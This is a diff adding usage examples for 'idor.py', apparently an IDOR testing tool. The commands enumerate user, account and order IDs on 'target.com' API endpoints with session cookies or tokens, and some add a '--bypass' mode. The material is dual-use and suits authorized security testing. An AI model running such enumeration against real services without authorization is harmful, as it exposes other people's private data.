@@ -1,0 +1,21 @@
+# basic scan — try ids 1..50
+./idor.py scan -u "https://target.com/api/users/{ID}" -c "session=abc123"
+
+# with baseline comparison against your own id
+./idor.py scan -u "https://target.com/account/{ID}" \
+  --baseline-id 5 --id-start 1 --id-end 200 \
+  -c "session=abc123"
+
+# POST body with id
+./idor.py scan -u "https://target.com/api/orders" \
+  -m POST -d "order_id={ID}" \
+  -H "Content-Type: application/json" \
+  -a "eyJhbGciOi..." -o results.json
+
+# scan + bypass in one shot
+./idor.py scan -u "https://target.com/api/users/{ID}" \
+  -c "session=abc123" --bypass -o results.json
+
+  bypass a single id 
+  ./idor.py bypass -u "https://target.com/api/users/{ID}" \
+  --id 42 -c "session=abc123"
